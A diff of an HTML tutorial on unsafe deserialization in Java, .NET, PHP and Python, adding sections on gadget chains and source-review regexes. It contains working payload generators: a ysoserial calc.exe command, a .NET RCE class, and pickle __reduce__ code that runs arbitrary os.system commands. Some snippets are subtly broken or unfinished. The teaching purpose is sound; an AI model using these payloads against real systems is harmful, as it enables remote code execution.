@@ -1056,9 +1056,9 @@ body .markdown-body
 .codehilite .il{color:#009999}
 .codehilite .gc{color:#999;background-color:#EAF2F5}
 </style><title>readme</title></head><body><article class="markdown-body"><h1 id="the-big-problem-of-serialization">The big problem of serialization<a class="headerlink" href="#the-big-problem-of-serialization" title="Permanent link"></a></h1>
-<p>One of the biggest security issues affecting OOP Languages during the last years was &ldquo;Unsafe Deserialization&rdquo;. As a wide range of literature is already available for this issue, this post objective is not to introduce something new about it, but to provide a brief and precise explaination of the vulnerability, as well as common exploitation and detection methods applied on different programming languages. </p>
+<p>One of the biggest security issues affecting OOP Languages during the last years was &ldquo;Unsafe Deserialization&rdquo;. As a wide range of literature is already available for this issue, the main objective of this document is not to introduce something new about it, but to provide a brief and precise explaination of the vulnerability, as well as common exploitation and detection methods, which can be applied on different programming languages. </p>
 <h2 id="serialization-what-is-it">Serialization: What is it?<a class="headerlink" href="#serialization-what-is-it" title="Permanent link"></a></h2>
-<p>Object serialization, also known as &ldquo;marshalling&rdquo;, is just a process that converts an object-state, in the form of an arbitratily complicated data structure, in a way (commonly a serialized string) that can be easily sent in message, or stored in a database or a text file. The serialized object-state could then be reconstructed using the opposite process, called deserialization, or &ldquo;unmarshalling&rdquo;, producing an object that is &ldquo;semantically&rdquo; identical to the original.</p>
+<p>Object serialization, also known as &ldquo;marshalling&rdquo;, is just a process that converts an object-state, in the form of an arbitratily complicated data structure, in a way (commonly a serialized string) that can be easily sent in message, stored in a database, or saved in a text file. The serialized object-state could then be reconstructed using the opposite process, called deserialization, or &ldquo;unmarshalling&rdquo;, producing an object that is &ldquo;semantically&rdquo; identical to the original.</p>
 <p>If we look at just the definition, it seems to be an easy process, but effectively it&rsquo;s not. Serialization is a low-level technique that violates encapsulation and breaks the opacity of an abstract data type. </p>
 <p>In many programming languages, the ones we are more interested in, serialization is natively supported (usually within core libraries) and no additional code development is required.</p>
 <p>These languages are:</p>
@@ -1182,7 +1182,7 @@ The most common method used to serialize objects is using ByteStreams. A simple 
 
 <p>The starting bytes, <code>ac ed 00 05</code> are a known signature for JAVA serialized objects. Prior to step further on, we should notice that the <code>Deserialize</code> function, calls one of the potentially exploitable function of JAVA, <code>readObject()</code>. This function, indeed, constitutes one of the POP gadget of JAVA. During the deserialization via <code>readObject()</code>, the serialized-object properties are accessed recursively, untill every properties have been read. This process occurs due to the nature of serialization (As an exact clone of the original object is the result of this process, each and every properties must be read and re-instantiated). </p>
 <p>How can we exploit it? Basically, the trick is to pass an arbitrary nested object to the <code>readObject()</code> function, forcing the application to instantiate a chain of POP gadgets, leading to RCE. The POP gadgets that can be used may vary depending on the application <code>CLASSPATH</code> (as any gadget function must be on the classpath in order to be instantiated [Visibility Constraint]). 
-The ROP chain uses an opaque class order in order to chain subsequent classes using reflection, which allows dynamic class and method loading even without prior knowledge of these classes and methods. The main pattern used to create chains is to use the DynamicProxy pattern, which more details can be found <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html">here</a>.</p>
+The ROP chain uses an opaque class order in order to chain subsequent classes using reflection, which allows to dynamically load classes and methods even without prior knowledge of these classes and methods. The main pattern used to create chains is to use the DynamicProxy pattern, which more details can be found <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html">here</a>.</p>
 <p>Following, a very basic example of DynamicProxy implementation:</p>
 <div class="codehilite"><pre><span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
 <span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
@@ -1252,9 +1252,9 @@ The ROP chain uses an opaque class order in order to chain subsequent classes us
 <div class="codehilite"><pre><span class="nv">$ </span>ysoserial CommonsCollections7 <span class="s2">&quot;cmd /c calc.exe&quot;</span> &gt; ./Serialize/de.ser
 </pre></div>
 
-<p>If you try to open it uing the example JAVA file, of course it won&rsquo;t work, showing a <code>java.lang.ClassNotFoundException: org.apache.commons.collections.map.LazyMap</code> exception. The reason is always the &ldquo;visibility constraint&rdquo;. As this payload uses <code>CommonsCollections:3.1</code>, which is not part of standard JAVA SDK, the POP gadgets to build the required chain cannot be found. In order to make it working, we should be sure to have this dependency in the application classpath. A working example, where the <code>org.apache.commons-collections:3.1</code> dependency has been added, can be found <a href="C:/Users/d3adc0de/Desktop/Shared/PenetrationTesting/Git%20Personal%20Projects/klezVirus.github.io/The_Big_Problem_of_Serialisation/serialization/java">here</a>. </p>
-<p>Now that we have a general understanding of the process, let&rsquo;s try to describe the full steps occuring during deserialisation in Java using CommonsCollections.</p>
-<p>Payloads generated with ysoserial share a common structure, which use a Payload Runner using maps to setup the conditions and a transformer to actually build and run the OS command. </p>
+<p>If you try to open it using the example JAVA file, of course it won&rsquo;t work, showing a <code>java.lang.ClassNotFoundException: org.apache.commons.collections.map.LazyMap</code> exception. The reason is always the &ldquo;visibility constraint&rdquo;. As this payload uses <code>CommonsCollections:3.1</code>, which is not part of standard JAVA SDK, the POP gadgets to build the required chain cannot be found. In order to make it work, we should be sure to have this dependency on the application classpath. A working example, where the <code>org.apache.commons-collections:3.1</code> dependency has been added, can be found <a href="C:/Users/d3adc0de/Desktop/Shared/PenetrationTesting/Git%20Personal%20Projects/klezVirus.github.io/The_Big_Problem_of_Serialisation/serialization/java">here</a>. </p>
+<p>Now that we have a general understanding of the process, let&rsquo;s try to describe the full steps occuring during deserialisation in Java using CommonsCollections7.</p>
+<p>Payloads generated with ysoserial share a common structure, which use a Payload Runner using maps to setup the conditions, and a transformer to actually build and run OS commands. </p>
 <p>Let&rsquo;s take a deep look at CommonsCollections7:</p>
 <p><div class="codehilite"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CommonsCollections7</span> <span class="kd">extends</span> <span class="n">PayloadRunner</span> <span class="kd">implements</span> <span class="n">ObjectPayload</span><span class="o">&lt;</span><span class="n">Hashtable</span><span class="o">&gt;</span> <span class="o">{</span>
 
@@ -1315,12 +1315,12 @@ Let&rsquo;s dissect the above code:</p>
 </li>
 <li>We forced an hash collishion, so a comparison is issued using <code>equals</code></li>
 <li>The decorator forwards the method to the AbstractMap -&gt; lazyMap</li>
-<li>The lazyMap attempts to retrieve a value with key equal to the map</li>
+<li>The lazyMap attempts to retrieve a value with a key equal to the &ldquo;map&rdquo;</li>
 <li>Since that key does not exist, the lazyMap instance goes ahead and tries to create a new key</li>
 <li>Since  a  chainedTransformer  is  set  to  execute  during  the  key  creation process, the chained transformer with the malicious payload is invoked, leading to remote code execution.</li>
 </ol>
 <h4 id="java-text-based-seriliazation-archive">Java: Text-based Seriliazation Archive<a class="headerlink" href="#java-text-based-seriliazation-archive" title="Permanent link"></a></h4>
-<p>Of course, this is problem doesn&rsquo;t affect just the binary archive format, but can be extended to text-based serialization archives. As we said, the most common formats used are XML and JSON.</p>
+<p>Of course, this issue doesn&rsquo;t affect just the binary archive format, but can be extended to text-based serialization archives. As we said, the most common formats used are XML and JSON.</p>
 <p><strong>XML</strong></p>
 <p>XML Serialization/Deserialization is mainly offered by the XMLEncoder/XMLDecoder and XStream classes. These classes are known to be susceptible to deserialisation issues leading to RCE.</p>
 <p>Let&rsquo;s consider the following example:</p>
@@ -1531,12 +1531,9 @@ JSON-IO allows to specify the type of the object to be deserialized within the J
                 <span class="n">BinarySerialization</span><span class="p">.</span><span class="n">deleteFile</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
                 <span class="n">BinarySerialization</span><span class="p">.</span><span class="n">desertSerial</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
             <span class="p">}</span>
-
             <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">();</span>
             <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Press Enter Key&quot;</span><span class="p">);</span>
             <span class="n">Console</span><span class="p">.</span><span class="n">Read</span><span class="p">();</span>
-
-
         <span class="p">}</span>
 
         <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">deleteFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">filname</span><span class="p">)</span>
@@ -1571,7 +1568,6 @@ JSON-IO allows to specify the type of the object to be deserialized within the J
             <span class="n">formatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">desert</span><span class="p">);</span>
             <span class="n">stream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
         <span class="p">}</span>
-
     <span class="p">}</span>
 
 <span class="na">    [Serializable]</span>
@@ -1646,7 +1642,7 @@ JSON-IO allows to specify the type of the object to be deserialized within the J
 <li>Implementing magic &ldquo;functions&rdquo; (we&rsquo;ll see an example below), like:<ul>
 <li>Get/Set</li>
 <li>OnSerialisation</li>
-<li>Hash</li>
+<li>Constructors/Destructors</li>
 </ul>
 </li>
 </ul>
@@ -2027,23 +2023,26 @@ Available plugins:
 <span class="p">}</span>
 </pre></div>
 
-<p>How can this be exploited? By default, Microsoft doesn&rsquo;t enforce type signatures of delegate objects, so the main idea is to find a way to set the <code>_delegate</code> parameter to <code>System.Diagnostic.Process</code> and <code>_parameters</code> to a command we want to execute. </p>
+<p>How can this be exploited? The main idea is to find a way to set the <code>_delegate</code> parameter to <code>System.Diagnostic.Process</code> and <code>_parameters</code> to a command we want to execute. </p>
 <p>To achieve this result, <code>TypeConfuseDelegate</code> generates a payload operating the following steps:</p>
 <ol>
 <li>Create a Comparison object (function to compare strings)</li>
 <li>Create a MulticastDelegate with two entries, setting both of them to Comparison (so now we have MulticastDelegate<Comparison(String,String),Comparison(String,String)>)</li>
 <li>Create a SortedSet, and associate the ComparisonComparer as the compare function  </li>
-<li>Using introspection, change the type of one of the Comparison objects to Process.Start</li>
+<li>Using introspection, change the type of one of the Comparison objects to Process.Start<ul>
+<li>This works because, by default, Microsoft doesn&rsquo;t enforce type signatures of delegate objects</li>
+</ul>
+</li>
 <li>Add to the SortedSet two strings (&ldquo;cmd&rdquo;, &ldquo;args&rdquo;)</li>
 </ol>
 <p><em>Note that cmd, args could be any command - args combination</em></p>
 <p>Upon deserialization, the following would then happen:</p>
 <ol>
 <li>To rebuild the SortedSet, the comparison function is reinitialised</li>
-<li>The ComparerComparison call the MulticastDelegate as its comparison delegate</li>
-<li>To operate the comparison, the MulticastDelegate run the Compare() and Start() functions in parallel</li>
-<li>Compare will just compare &ldquo;cmd&rdquo; and &ldquo;arg&rdquo; as strings</li>
-<li>Start will spawn a process and execute the &ldquo;cmd&rdquo; and &ldquo;args&rdquo; as OS commands</li>
+<li>The ComparerComparison calls the MulticastDelegate as its comparison delegate</li>
+<li>To operate the comparison, the MulticastDelegate runs the Compare() and Start() functions in parallel</li>
+<li>Compare() will just compare &ldquo;cmd&rdquo; and &ldquo;arg&rdquo; as strings</li>
+<li>Start() will spawn a process and execute the &ldquo;cmd&rdquo; and &ldquo;args&rdquo; as OS commands</li>
 </ol>
 <h4 id="net-text-based-archive-format">.NET: Text-Based Archive Format<a class="headerlink" href="#net-text-based-archive-format" title="Permanent link"></a></h4>
 <p>As for JAVA, .NET is not immune to deserialization issues affecting Text-Based archive formats, such as XML, JSON, [Net]DataContract. These formats are usually handled by the following serializers:</p>
@@ -2053,18 +2052,80 @@ Available plugins:
 <li>JavaScriptSerializer (JSON)</li>
 </ul>
 <p><strong>XML</strong></p>
+<p>As an example of XML Seriliazation, let&rsquo;s consider the following example:</p>
+<div class="codehilite"><pre><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">xmlDesertDeserial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span> 
+<span class="p">{</span>
+    <span class="kt">var</span> <span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">FileStream</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Open</span><span class="p">,</span> <span class="n">FileAccess</span><span class="p">.</span><span class="n">Read</span><span class="p">);</span>
+    <span class="kt">var</span> <span class="n">reader</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StreamReader</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
+    <span class="n">XmlSerializer</span> <span class="n">serializer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">XmlSerializer</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">Desert</span><span class="p">));</span>
+    <span class="c1">// Deseriliazing a dEsert object.. isn&#39;t it?</span>
+    <span class="kt">var</span> <span class="n">desert</span> <span class="p">=</span> <span class="p">(</span><span class="n">Desert</span><span class="p">)</span><span class="n">serializer</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">reader</span><span class="p">);</span>
+    <span class="n">reader</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
+    <span class="n">stream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>The only valuable pieces to note are:</p>
+<ul>
+<li>The <code>(Desert)serializer.Deserialize(reader)</code> cast doesn&rsquo;t offer any additional protection, as the cast logically comes AFTER the deserialization process</li>
+<li>The <code>typeof(Desert)</code> will forbid the XmlSerializer to deserialize other Classes</li>
+</ul>
+<p>So, if we craft an xml using the following serializer, it won&rsquo;t work:</p>
+<div class="codehilite"><pre><span class="na"> [Serializable]</span>
+<span class="k">public</span> <span class="k">class</span> <span class="nc">RCE</span> <span class="p">:</span> <span class="n">IDeserializationCallback</span>
+<span class="p">{</span>
+    <span class="k">private</span> <span class="n">String</span> <span class="n">_cmd</span> <span class="p">=</span> <span class="s">&quot;calc.exe&quot;</span><span class="p">;</span>
+    <span class="k">public</span> <span class="n">String</span> <span class="n">cmd</span>
+    <span class="p">{</span>
+        <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="n">_cmd</span><span class="p">;</span>  <span class="p">}</span>
+        <span class="k">set</span> <span class="p">{</span> <span class="n">_cmd</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span> <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">void</span> <span class="nf">Run</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span> <span class="n">p</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">();</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="n">_cmd</span><span class="p">;</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">Dispose</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">xmlRCESerial</span><span class="p">(</span><span class="kt">string</span> <span class="n">filename</span><span class="p">)</span> 
+<span class="p">{</span>
+    <span class="c1">// Create desert name</span>
+    <span class="kt">var</span> <span class="n">rce</span> <span class="p">=</span> <span class="k">new</span> <span class="n">RCE</span><span class="p">();</span>
+    <span class="c1">// Persist to file</span>
+    <span class="n">TextWriter</span> <span class="n">writer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">StreamWriter</span><span class="p">(</span><span class="n">filename</span> <span class="p">+</span> <span class="s">&quot;.xml&quot;</span><span class="p">);</span>
+    <span class="n">XmlSerializer</span> <span class="n">serializer</span> <span class="p">=</span> <span class="k">new</span> <span class="n">XmlSerializer</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">Desert</span><span class="p">));</span>
+    <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&quot;Serializing desert (!?)&quot;</span><span class="p">);</span>
+    <span class="n">serializer</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">writer</span><span class="p">,</span> <span class="n">rce</span><span class="p">);</span>
+    <span class="n">writer</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
+<span class="p">}</span> 
+</pre></div>
+
+<p>However, it is possible to exploit this function chaining POP gadgets. To generate a valid payload, in this case, we can use <code>ysoserial.net</code>:</p>
+<div class="codehilite"><pre><span class="nv">$ </span>
+</pre></div>
+
+<p><strong>JSON</strong></p>
+<p>In their reasearch, <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf">Firday the 13th, JSON Attacks</a> </p>
 <p>The </p>
-<p>To get a better look to the process, we&rsquo;ll explore a way to use the XAML formatter to achieve remote code execution during deserialization abusing the gadget <code>ObectDataProvider</code>.</p>
-<p>The follwing PoC uses the steps above to serialize data which results in an RCE:</p>
 <p><strong>Tips for Source Code reviewers</strong></p>
-<p>To find this kind of vulnerability it is usually enough to search the code for common regexes, like: </p>
+<p>To find this kind of vulnerability it is usually a good start to search the code for common regexes, like: </p>
 <ul>
 <li><code>(JavaScript|Xml|(Net)*DataContract)Serializer</code></li>
-<li><code>(Binary|ObjectState|Los|Soap)Formatter</code></li>
+<li><code>(Binary|ObjectState|Los|Soap|Client|Server)Formatter</code></li>
 <li><code>Json.Net</code></li>
 <li><code>YamlDotNet</code></li>
 <li><code>FastJson</code></li>
 <li><code>Xaml</code></li>
+<li><code>TypeNameHandling</code></li>
+<li><code>SimpleTypeResolver</code></li>
+<li><code>(Serialization|Deerialize|UnsafeDeserialize)</code></li>
+<li><code>(ComponentModel.Activity|Load|Activity.Load)</code></li>
+<li><code>ResourceReader</code></li>
+<li><code>(ProxyObject|DecodeSerializedObject|DecodeValue)</code></li>
+<li><code>ServiceStack.Text</code></li>
 </ul>
 <p>For each match, the code should be manually inspected to see whether the object read can be manipulated by an external attacker.</p>
 <h4 id="references">References:<a class="headerlink" href="#references" title="Permanent link"></a></h4>
@@ -2081,4 +2142,318 @@ O:8:&quot;abcd1234&quot;:1:{s:7:&quot;AString&quot;;s:13:&quot;AnotherString&quo
 
 <p>A good example of serialized object in PHP is the session file, usually stored within <code>/var/lib/php5/sess_[PHPSESSID]</code>.</p>
 <h4 id="php-how-the-exploitation-works">PHP: How the exploitation works<a class="headerlink" href="#php-how-the-exploitation-works" title="Permanent link"></a></h4>
-<p>The exploitation in PHP is strictly dependent on the specific application implementation.</p></article></body></html>
+<p>The exploitation in PHP strictly depends on an application specific implementation.</p>
+<h3 id="python">Python<a class="headerlink" href="#python" title="Permanent link"></a></h3>
+<p>Python as well offers built-in support for serialization/deserialization, with many library that can easily marshal an objects using different archive-formats, as binary, XML, JSON, YAML, and so on.
+Within the years, a few module were found to be affected by unsafe deserialization issues
+only two libraries were found to be affected by unsafe deserialization issues, though. Those were Pickle, handling binary serialization, and PyYAML, handling YAML deserialization.</p>
+<h4 id="python-binary-archive-format">Python: Binary Archive Format<a class="headerlink" href="#python-binary-archive-format" title="Permanent link"></a></h4>
+<p>In Python, the main library hanlding Binary serialization is Pickle (provided in different packages, as cPickle, pickle and _pickle). This library is know to be affected by an RCE upon deserilization.</p>
+<p>Let&rsquo;s consider the following piece of code:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">_pickle</span>
+
+<span class="k">class</span> <span class="nc">Desert</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">width</span><span class="p">,</span> <span class="n">heigth</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">width</span> <span class="o">=</span> <span class="n">width</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">height</span> <span class="o">=</span> <span class="n">height</span>
+
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">Desert</span><span class="p">(</span><span class="s">&quot;Gobi&quot;</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
+
+<span class="c1"># The application insecurely deserializes a file</span>
+<span class="k">def</span> <span class="nf">desert_deserialize</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">desert_file</span><span class="p">:</span>
+        <span class="n">_pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">desert_file</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">desert</span> <span class="o">=</span> <span class="n">desert_deserialize</span><span class="p">()</span>
+</pre></div>
+
+<p>As you can see, the cPickle <code>load()</code> function is called without any prior check on the file content, allowing an attcker to pass an arbitrary binary payload to the application.</p>
+<p>How can we exploit it, then? In Python, we don&rsquo;t actually have any tool like ysoserial, and we don&rsquo;t have a clear definition of POP gadget as it was for the previous languages we encountered so far, but in this context, we actually don&rsquo;t need them at all.</p>
+<p>Indeed, for pickle, _pickle and cPickle, we can craft a payload using a simple piece of code, like the following:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">_pickle</span>
+
+<span class="k">class</span> <span class="nc">Payload</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">&#39;whoami&#39;</span><span class="p">,))</span>
+
+<span class="k">def</span> <span class="nf">serialize_exploit</span><span class="p">():</span>
+    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">_pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Exploit</span><span class="p">())</span>
+    <span class="k">return</span> <span class="n">shellcode</span>
+</pre></div>
+
+<p>Changing the return function it would be possible to generate the payload needed to execute different commands.</p>
+<p>It is enough, however, it is more than possible to create something way more general than this, using various techniques, the first we&rsquo;ll see is known as dynamic class generation, code below:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">_pickle</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">Payload</span><span class="p">:</span>
+    <span class="k">pass</span>
+
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">pass</span>
+
+<span class="k">def</span> <span class="nf">_patch</span><span class="p">(</span><span class="n">bytestream</span><span class="p">):</span>
+    <span class="n">byte_array</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">bytestream</span><span class="p">)</span>
+    <span class="n">byte_array</span><span class="p">[</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="s">&quot;52&quot;</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">byte_array</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">generate_class</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">name</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">None</span>
+    <span class="k">elif</span> <span class="ow">not</span> <span class="n">methods</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">None</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nb">type</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="p">(</span><span class="nb">object</span><span class="p">,),</span> <span class="n">methods</span><span class="p">)()</span>
+
+<span class="k">def</span> <span class="nf">serialize_class</span><span class="p">(</span><span class="n">commands</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">commands</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[-] No command provided&quot;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">methods</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s">&quot;__reduce__&quot;</span><span class="p">:</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">:</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">commands</span><span class="p">,))</span>
+        <span class="p">}</span>
+        <span class="n">cls</span> <span class="o">=</span> <span class="n">generate_class</span><span class="p">(</span><span class="s">&quot;Payload&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">cls</span><span class="o">.</span><span class="n">__reduce__</span><span class="p">()</span>
+
+<span class="n">command</span> <span class="o">=</span> <span class="s">&quot; &quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
+<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;[+] Generating serialized object for:&quot;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">&quot;    {command}&quot;</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;payload&quot;</span><span class="p">,</span> <span class="s">&quot;wb&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">payload</span><span class="p">:</span>
+    <span class="n">payload</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">_patch</span><span class="p">(</span><span class="n">_pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">serialize_class</span><span class="p">(</span><span class="n">command</span><span class="p">))))</span>
+</pre></div>
+
+<p>As you may notice, a function called <code>_patch</code> is applied to the serialized object, applying a patch to the binary archive after serialization. This trick has been used because the lambda function, although being bound to the attribute <code>__reduce__</code> is not interpreted as the reduce method, but as a lambda function:</p>
+<ul>
+<li>Static definition</li>
+</ul>
+<div class="codehilite"><pre>&gt;&gt;&gt; print(Payload.__getattribute__(Payload(), &quot;__reduce__&quot;))
+&lt;bound method Payload.__reduce__ of &lt;__main__.Payload object at 0x00000209218B9518&gt;&gt;
+</pre></div>
+
+<ul>
+<li>Dynamic definition</li>
+</ul>
+<div class="codehilite"><pre>&gt;&gt;&gt; cls = generate_class(&quot;Payload&quot;, methods)
+&gt;&gt;&gt; print(cls.__getattribute__(&quot;__reduce__&quot;))
+&lt;bound method serialize_class.&lt;locals&gt;.&lt;lambda&gt; of &lt;__main__.Payload object at 0x00000209218B9080&gt;&gt;
+</pre></div>
+
+<p>Although that would not stop the serialization, it would cause the payload to not be executed upon deserialization. However, the <code>_patch</code> function successfully fix this issue at byte-code level, making the payload executable again.</p>
+<p>There is, however, a nicer way of achieving that, keeping the good part (setting arbitrary commands), and avoiding the bad one (dynamic class definition and patching), but we&rsquo;ll see it later, when we&rsquo;ll craft a simple payload generator for both binary and text-based formats.</p>
+<h4 id="python-text-based-archive-format">Python: Text-Based Archive Format<a class="headerlink" href="#python-text-based-archive-format" title="Permanent link"></a></h4>
+<p>As we now, several different libraries are offered by Python which support text-based serialization archives, such as json (or simplejson), or ETree (for XML). Even though most of these libraries are known to be secure, a few of them are susceptible to this kind of attack. In the following paragraphs, we&rsquo;ll briefly explain how the text-based serialization works, how to exploit it, and how to generate custom payloads.</p>
+<p><strong>YAML</strong></p>
+<p>The first of the library we&rsquo;re going to analyse is PyYAML; as its name suggests, it is a library to handle the YAML format. As previously stated, it was found to be vulnerable to deserialization issues.</p>
+<p>Before digging into how to exploit this kind of vulnerability, let&rsquo;s take a brief look at the serialization process. The following example shows a very simple object being serialized from the python console:</p>
+<div class="codehilite"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">([{</span><span class="s">&quot;a&quot;</span><span class="p">:</span><span class="s">&quot;b&quot;</span><span class="p">}])</span>
+<span class="s">&#39;- a: b</span><span class="se">\n</span><span class="s">&#39;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">yaml</span><span class="o">.</span><span class="n">dump</span><span class="p">([{</span><span class="s">&quot;a&quot;</span><span class="p">:(</span><span class="s">&quot;b&quot;</span><span class="p">,</span><span class="s">&quot;c&quot;</span><span class="p">)}])</span>
+<span class="s">&#39;- a: !!python/tuple</span><span class="se">\n</span><span class="s">  - b</span><span class="se">\n</span><span class="s">  - c</span><span class="se">\n</span><span class="s">&#39;</span>
+</pre></div>
+
+<p>Analyse the serialized object is not difficult, dict and lists are handled nicely, while other object must be seriliazed with their class notation. The above object, for example, would be translated as:</p>
+<div class="codehilite"><pre><span class="o">-</span>                 <span class="o">====</span> <span class="p">[</span> 
+<span class="n">a</span> <span class="p">:</span><span class="err">!!</span><span class="n">python</span><span class="o">/</span><span class="nb">tuple</span> <span class="o">====</span> <span class="p">{</span><span class="n">a</span> <span class="p">:</span> <span class="nb">tuple</span><span class="p">(</span>
+<span class="o">-</span> <span class="n">b</span> <span class="o">-</span> <span class="n">c</span>           <span class="o">====</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span>
